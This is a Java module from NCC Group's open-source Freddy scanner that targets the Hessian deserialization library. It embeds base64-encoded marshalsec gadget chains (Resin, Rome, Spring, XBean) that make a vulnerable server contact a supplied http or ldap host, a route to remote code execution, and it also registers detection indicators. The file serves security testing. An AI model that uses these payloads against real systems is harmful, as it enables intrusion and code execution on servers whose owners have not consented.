// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the Java Hessian library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class HessianModule extends FreddyModuleBase {
    //Resin payload data
    private static final int RESIN_PAYLOAD_CMD_OFFSET = 357;
    private static final String RESIN_PREFIX_B64 = "TXQAAE10ABdjb20uY2F1Y2hvLm5hbWluZy5RTmFtZVMACF9jb250ZXh0TXQAJ2phdmF4Lm5hbWluZy5zcGkuQ29udGludWF0aW9uRGlyQ29udGV4dFMAA2NwZU10ACNqYXZheC5uYW1pbmcuQ2Fubm90UHJvY2VlZEV4Y2VwdGlvblMADXJvb3RFeGNlcHRpb25OUwANZGV0YWlsTWVzc2FnZU5TAAVjYXVzZU5TABByZW1haW5pbmdOZXdOYW1lTlMAC2Vudmlyb25tZW50TlMAB2FsdE5hbWVOUwAKYWx0TmFtZUN0eE5TAAxyZXNvbHZlZE5hbWVOUwALcmVzb2x2ZWRPYmpNdAAWamF2YXgubmFtaW5nLlJlZmVyZW5jZVMACWNsYXNzTmFtZVMAA0Zvb1MADGNsYXNzRmFjdG9yeVMABkZyZWRkeVMAFGNsYXNzRmFjdG9yeUxvY2F0aW9uUwDI";
    private static final String RESIN_SUFFIX_B64 = "UwAFYWRkcnNWdAAQamF2YS51dGlsLlZlY3RvcmwAAAAAenpTAA1yZW1haW5pbmdOYW1lTlMACnN0YWNrVHJhY2VWdAAcW2phdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudGwAAAAJTXQAG2phdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudFMADmRlY2xhcmluZ0NsYXNzUwAYbWFyc2hhbHNlYy5nYWRnZXRzLlJlc2luUwAKbWV0aG9kTmFtZVMADm1ha2VSZXNpblFOYW1lUwAIZmlsZU5hbWVTAApSZXNpbi5qYXZhUwAKbGluZU51bWJlckkAAAA4ek10ABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRTAA5kZWNsYXJpbmdDbGFzc1MAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbFMACm1ldGhvZE5hbWVTAAdpbnZva2UwUwAIZmlsZU5hbWVOUwAKbGluZU51bWJlckn////+ek10ABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRTAA5kZWNsYXJpbmdDbGFzc1MAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbFMACm1ldGhvZE5hbWVTAAZpbnZva2VTAAhmaWxlTmFtZU5TAApsaW5lTnVtYmVySf////96TXQAG2phdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudFMADmRlY2xhcmluZ0NsYXNzUwAoc3VuLnJlZmxlY3QuRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbFMACm1ldGhvZE5hbWVTAAZpbnZva2VTAAhmaWxlTmFtZU5TAApsaW5lTnVtYmVySf////96TXQAG2phdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudFMADmRlY2xhcmluZ0NsYXNzUwAYamF2YS5sYW5nLnJlZmxlY3QuTWV0aG9kUwAKbWV0aG9kTmFtZVMABmludm9rZVMACGZpbGVOYW1lTlMACmxpbmVOdW1iZXJJ/////3pNdAAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50UwAOZGVjbGFyaW5nQ2xhc3NTABltYXJzaGFsc2VjLk1hcnNoYWxsZXJCYXNlUwAKbWV0aG9kTmFtZVMADGNyZWF0ZU9iamVjdFMACGZpbGVOYW1lUwATTWFyc2hhbGxlckJhc2UuamF2YVMACmxpbmVOdW1iZXJJAAABS3pNdAAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50UwAOZGVjbGFyaW5nQ2xhc3NTABltYXJzaGFsc2VjLk1hcnNoYWxsZXJCYXNlUwAKbWV0aG9kTmFtZVMABWRvUnVuUwAIZmlsZU5hbWVTABNNYXJzaGFsbGVyQmFzZS5qYXZhUwAKbGluZU51bWJlckkAAAClek10ABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRTAA5kZWNsYXJpbmdDbGFzc1MAGW1hcnNoYWxzZWMuTWFyc2hhbGxlckJhc2VTAAptZXRob2ROYW1lUwADcnVuUwAIZmlsZU5hbWVTABNNYXJzaGFsbGVyQmFzZS5qYXZhUwAKbGluZU51bWJlckkAAAB5ek10ABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRTAA5kZWNsYXJpbmdDbGFzc1MAEm1hcnNoYWxzZWMuSGVzc2lhblMACm1ldGhvZE5hbWVTAARtYWluUwAIZmlsZU5hbWVTAAxIZXNzaWFuLmphdmFTAApsaW5lTnVtYmVySQAAAEB6elMAFHN1cHByZXNzZWRFeGNlcHRpb25zTnpTAANlbnZNdAATamF2YS51dGlsLkhhc2h0YWJsZXpTAAdjb250Q3R4TnpTAAZfaXRlbXNWbAAAAAJTAANmb29TAANiYXJ6elIAAAABTXQAMWNvbS5zdW4ub3JnLmFwYWNoZS54cGF0aC5pbnRlcm5hbC5vYmplY3RzLlhTdHJpbmdTAAVtX29ialMABOunpg8aC1MACG1fcGFyZW50TnpSAAAAEno=";
    //Rome payload data
    private static final int ROME_PAYLOAD_CMD_OFFSET = 325;
    private static final String ROME_PREFIX_B64 = "TXQAAE10ACdjb20ucm9tZXRvb2xzLnJvbWUuZmVlZC5pbXBsLkVxdWFsc0JlYW5TAAliZWFuQ2xhc3NNdAAPamF2YS5sYW5nLkNsYXNzUwAEbmFtZVMAKWNvbS5yb21ldG9vbHMucm9tZS5mZWVkLmltcGwuVG9TdHJpbmdCZWFuelMAA29iak10ACljb20ucm9tZXRvb2xzLnJvbWUuZmVlZC5pbXBsLlRvU3RyaW5nQmVhblMACWJlYW5DbGFzc010AA9qYXZhLmxhbmcuQ2xhc3NTAARuYW1lUwAdY29tLnN1bi5yb3dzZXQuSmRiY1Jvd1NldEltcGx6UwADb2JqTXQAHWNvbS5zdW4ucm93c2V0LkpkYmNSb3dTZXRJbXBsUwAHY29tbWFuZE5TAANVUkxOUwAKZGF0YVNvdXJjZVMAyA==";
    private static final String ROME_SUFFIX_B64 = "UwAKcm93U2V0VHlwZUkAAAPsUwALc2hvd0RlbGV0ZWRGUwAMcXVlcnlUaW1lb3V0SQAAAABTAAdtYXhSb3dzSQAAAABTAAxtYXhGaWVsZFNpemVJAAAAAFMAC2NvbmN1cnJlbmN5SQAAA/BTAAhyZWFkT25seVRTABBlc2NhcGVQcm9jZXNzaW5nVFMACWlzb2xhdGlvbkkAAAACUwAIZmV0Y2hEaXJJAAAD6FMACWZldGNoU2l6ZUkAAAAAUwAEY29ubk5TAAJwc05TAAJyc05TAAZyb3dzTUROUwAFcmVzTUROUwANaU1hdGNoQ29sdW1uc1Z0ABBqYXZhLnV0aWwuVmVjdG9ybAAAAApJ/////0n/////Sf////9J/////0n/////Sf////9J/////0n/////Sf////9J/////3pTAA9zdHJNYXRjaENvbHVtbnNWdAAQamF2YS51dGlsLlZlY3RvcmwAAAAKUwADZm9vTk5OTk5OTk5OelMADGJpbmFyeVN0cmVhbU5TAA11bmljb2RlU3RyZWFtTlMAC2FzY2lpU3RyZWFtTlMACmNoYXJTdHJlYW1OUwADbWFwTlMACWxpc3RlbmVyc05TAAZwYXJhbXNNdAATamF2YS51dGlsLkhhc2h0YWJsZXp6enpSAAAAAVIAAAABUgAAAAF6";
    //SpringAbstractBeanFactory payload data
    private static final int SABF_PAYLOAD_CMD_OFFSET1 = 93;
    private static final int SABF_PAYLOAD_CMD_OFFSET2 = 491;
    private static final String SABF_PREFIX_B64 = "TXQAAE10AEFvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5zdXBwb3J0LkRlZmF1bHRCZWFuRmFjdG9yeVBvaW50Y3V0QWR2aXNvclMADmFkdmljZUJlYW5OYW1lUwDI";
    private static final String SABF_MIDDLE_B64 = "UwAFb3JkZXJOUwAIcG9pbnRjdXRNdAAkb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuVHJ1ZVBvaW50Y3V0elMAC2JlYW5GYWN0b3J5TXQANm9yZy5zcHJpbmdmcmFtZXdvcmsuam5kaS5zdXBwb3J0LlNpbXBsZUpuZGlCZWFuRmFjdG9yeVMAC3Jlc291cmNlUmVmVFMAEnNoYXJlYWJsZVJlc291cmNlc1Z0ABFqYXZhLnV0aWwuSGFzaFNldGwAAAABUwDI";
    private static final String SABF_SUFFIX_B64 = "elMAEHNpbmdsZXRvbk9iamVjdHNNdAAAelMADXJlc291cmNlVHlwZXNNdAAAelMABmxvZ2dlck10ACdvcmcuYXBhY2hlLmNvbW1vbnMubG9nZ2luZy5pbXBsLk5vT3BMb2d6UwAMam5kaVRlbXBsYXRlTXQAJW9yZy5zcHJpbmdmcmFtZXdvcmsuam5kaS5KbmRpVGVtcGxhdGVTAAZsb2dnZXJNdAAnb3JnLmFwYWNoZS5jb21tb25zLmxvZ2dpbmcuaW1wbC5Ob09wTG9nelMAC2Vudmlyb25tZW50Tnp6elIAAAABTXQAQW9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLnN1cHBvcnQuRGVmYXVsdEJlYW5GYWN0b3J5UG9pbnRjdXRBZHZpc29yUwAOYWR2aWNlQmVhbk5hbWVOUwAFb3JkZXJOUwAIcG9pbnRjdXRSAAAAAlMAC2JlYW5GYWN0b3J5TnpSAAAACno=";
    //SpringPartiallyComparableAdvisor payload data
    private static final int SPCA_PAYLOAD_CMD_OFFSET1 = 835;
    private static final int SPCA_PAYLOAD_CMD_OFFSET2 = 1172;
    private static final String SPCA_PREFIX_B64 = "TXQAAE10ADdvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC50YXJnZXQuSG90U3dhcHBhYmxlVGFyZ2V0U291cmNlUwAGdGFyZ2V0TXQAbm9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmFzcGVjdGouYXV0b3Byb3h5LkFzcGVjdEpBd2FyZUFkdmlzb3JBdXRvUHJveHlDcmVhdG9yJFBhcnRpYWxseUNvbXBhcmFibGVBZHZpc29ySG9sZGVyUwAHYWR2aXNvck10ADZvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5hc3BlY3RqLkFzcGVjdEpQb2ludGN1dEFkdmlzb3JTAAVvcmRlck5TAAZhZHZpY2VNdAAzb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuYXNwZWN0ai5Bc3BlY3RKQXJvdW5kQWR2aWNlUwAOZGVjbGFyaW5nQ2xhc3NNdAAPamF2YS5sYW5nLkNsYXNzUwAEbmFtZVMAEGphdmEubGFuZy5PYmplY3R6UwAKbWV0aG9kTmFtZVMACHRvU3RyaW5nUwAKYXNwZWN0TmFtZU5TABBkZWNsYXJhdGlvbk9yZGVySQAAAABTAAx0aHJvd2luZ05hbWVOUwANcmV0dXJuaW5nTmFtZU5TABdkaXNjb3ZlcmVkUmV0dXJuaW5nVHlwZU5TABZkaXNjb3ZlcmVkVGhyb3dpbmdUeXBlTlMAFmpvaW5Qb2ludEFyZ3VtZW50SW5kZXhJAAAAAFMAIGpvaW5Qb2ludFN0YXRpY1BhcnRBcmd1bWVudEluZGV4SQAAAABTABVhcmd1bWVudHNJbnRyb3NwZWN0ZWRGUwAeZGlzY292ZXJlZFJldHVybmluZ0dlbmVyaWNUeXBlTlMADnBhcmFtZXRlclR5cGVzVnQAEFtqYXZhLmxhbmcuQ2xhc3NsAAAAAHpTAAhwb2ludGN1dE5TABVhc3BlY3RJbnN0YW5jZUZhY3RvcnlNdABLb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuYXNwZWN0ai5hbm5vdGF0aW9uLkJlYW5GYWN0b3J5QXNwZWN0SW5zdGFuY2VGYWN0b3J5UwAEbmFtZVMAyA==";
    private static final String SPCA_MIDDLE_B64 = "UwALYmVhbkZhY3RvcnlNdAA2b3JnLnNwcmluZ2ZyYW1ld29yay5qbmRpLnN1cHBvcnQuU2ltcGxlSm5kaUJlYW5GYWN0b3J5UwALcmVzb3VyY2VSZWZUUwASc2hhcmVhYmxlUmVzb3VyY2VzVnQAEWphdmEudXRpbC5IYXNoU2V0bAAAAAFTAMg=";
    private static final String SPCA_SUFFIX_B64 = "elMAEHNpbmdsZXRvbk9iamVjdHNNdAAAelMADXJlc291cmNlVHlwZXNNdAAAelMABmxvZ2dlck10ACdvcmcuYXBhY2hlLmNvbW1vbnMubG9nZ2luZy5pbXBsLk5vT3BMb2d6UwAMam5kaVRlbXBsYXRlTXQAJW9yZy5zcHJpbmdmcmFtZXdvcmsuam5kaS5KbmRpVGVtcGxhdGVTAAZsb2dnZXJNdAAnb3JnLmFwYWNoZS5jb21tb25zLmxvZ2dpbmcuaW1wbC5Ob09wTG9nelMAC2Vudmlyb25tZW50Tnp6UwAOYXNwZWN0TWV0YWRhdGFOelMADWFyZ3VtZW50TmFtZXNOUwAQYXJndW1lbnRCaW5kaW5nc056UwAIcG9pbnRjdXROelMACmNvbXBhcmF0b3JOenpSAAAAAU10ADdvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC50YXJnZXQuSG90U3dhcHBhYmxlVGFyZ2V0U291cmNlUwAGdGFyZ2V0TXQAMWNvbS5zdW4ub3JnLmFwYWNoZS54cGF0aC5pbnRlcm5hbC5vYmplY3RzLlhTdHJpbmdTAAVtX29ialMABOqsoxUHCVMACG1fcGFyZW50Tnp6UgAAAA96";
    //XBean payload data
    private static final int XBEAN_PAYLOAD_CMD_OFFSET = 298;
    private static final String XBEAN_PREFIX_B64 = "TXQAAE10ADdvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC50YXJnZXQuSG90U3dhcHBhYmxlVGFyZ2V0U291cmNlUwAGdGFyZ2V0TXQAO29yZy5hcGFjaGUueGJlYW4ubmFtaW5nLmNvbnRleHQuQ29udGV4dFV0aWwkUmVhZE9ubHlCaW5kaW5nUwAKaXNSZWxhdGl2ZUZTAARuYW1lUwADZm9vUwAJY2xhc3NOYW1lTlMACGZ1bGxOYW1lTlMABWlzUmVsVFMABXZhbHVlTXQAFmphdmF4Lm5hbWluZy5SZWZlcmVuY2VTAAljbGFzc05hbWVTAANmb29TAAxjbGFzc0ZhY3RvcnlTAAZGcmVkZHlTABRjbGFzc0ZhY3RvcnlMb2NhdGlvblMAyA==";
    private static final String XBEAN_SUFFIX_B64 = "UwAFYWRkcnNWdAAQamF2YS51dGlsLlZlY3RvcmwAAAAAenpTAAdjb250ZXh0TXQAL29yZy5hcGFjaGUueGJlYW4ubmFtaW5nLmNvbnRleHQuV3JpdGFibGVDb250ZXh0UwAPY2FjaGVSZWZlcmVuY2VzRlMAFHN1cHBvcnRSZWZlcmVuY2VhYmxlRlMAGWNoZWNrRGVyZWZlcmVuY2VEaWZmZXJlbnRGUwAWYXNzdW1lRGVyZWZlcmVuY2VCb3VuZEZTAA9uYW1lSW5OYW1lc3BhY2VOUwAKbW9kaWZpYWJsZUZTAAZpbkNhbGxOUwAJd3JpdGVMb2NrTlMAC2JpbmRpbmdzUmVmTlMACGluZGV4UmVmTlMAEWNvbnRleHRGZWRlcmF0aW9uTlMADW1hc3RlckNvbnRleHROUwAVcGFyc2VkTmFtZUluTmFtZXNwYWNlTlMADWNvbnRleHRBY2Nlc3NOelMACGJvdW5kT2JqUgAAAAN6elIAAAABTXQAN29yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLnRhcmdldC5Ib3RTd2FwcGFibGVUYXJnZXRTb3VyY2VTAAZ0YXJnZXRNdAAxY29tLnN1bi5vcmcuYXBhY2hlLnhwYXRoLmludGVybmFsLm9iamVjdHMuWFN0cmluZ1MABW1fb2JqUwAE5pe/AgMXUwAIbV9wYXJlbnROenpSAAAABno=";
    private byte[] RESIN_PAYLOAD;
    private byte[] ROME_PAYLOAD;
    private byte[] SABF_PAYLOAD;
    private byte[] SPCA_PAYLOAD;
    private byte[] XBEAN_PAYLOAD;

    protected void initialiseModule() {
        setName("Hessian");
        setPlatform(TargetPlatform.JAVA);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        //Initialise payload buffers
        RESIN_PAYLOAD = buildBinaryPayloadBuffer(RESIN_PREFIX_B64, RESIN_SUFFIX_B64, false);
        ROME_PAYLOAD = buildBinaryPayloadBuffer(ROME_PREFIX_B64, ROME_SUFFIX_B64, false);
        SABF_PAYLOAD = buildBinaryPayloadBuffer(SABF_PREFIX_B64, SABF_MIDDLE_B64, SABF_SUFFIX_B64, false);
        SPCA_PAYLOAD = buildBinaryPayloadBuffer(SPCA_PREFIX_B64, SPCA_MIDDLE_B64, SPCA_SUFFIX_B64, false);
        XBEAN_PAYLOAD = buildBinaryPayloadBuffer(XBEAN_PREFIX_B64, XBEAN_SUFFIX_B64, false);

        //Register passive/active scan payloads
        registerPassiveScanIndicator(new byte[]{0x4d, 0x74, 0x00}, IndicatorTarget.REQUEST);
        registerPassiveScanIndicator("com.caucho.hessian.io.HessianProtocolException", IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload(new byte[]{0x00}, "unknown code for readObject at 0x0");

        registerActiveScanCollaboratorPayload(PN_RESIN, true);
        registerActiveScanCollaboratorPayload(PN_ROME, true);
        registerActiveScanCollaboratorPayload(PN_SPRINGABF, true);
        registerActiveScanCollaboratorPayload(PN_SPRINGPCA, true);
        registerActiveScanCollaboratorPayload(PN_XBEAN, true);
    }

    protected byte[] generateCollaboratorBytePayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_RESIN:
                return generateBinaryPayload(RESIN_PAYLOAD, RESIN_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/", false);

            case PN_ROME:
                return generateBinaryPayload(ROME_PAYLOAD, ROME_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);

            case PN_SPRINGABF:
                return generateBinaryPayload(SABF_PAYLOAD, SABF_PAYLOAD_CMD_OFFSET1, SABF_PAYLOAD_CMD_OFFSET2, "ldap://" + hostname + "/", false);

            case PN_SPRINGPCA:
                return generateBinaryPayload(SPCA_PAYLOAD, SPCA_PAYLOAD_CMD_OFFSET1, SPCA_PAYLOAD_CMD_OFFSET2, "ldap://" + hostname + "/", false);

            case PN_XBEAN:
                return generateBinaryPayload(XBEAN_PAYLOAD, XBEAN_PAYLOAD_CMD_OFFSET, "http://" + hostname + "/", false);
        }
        return null;
    }
}
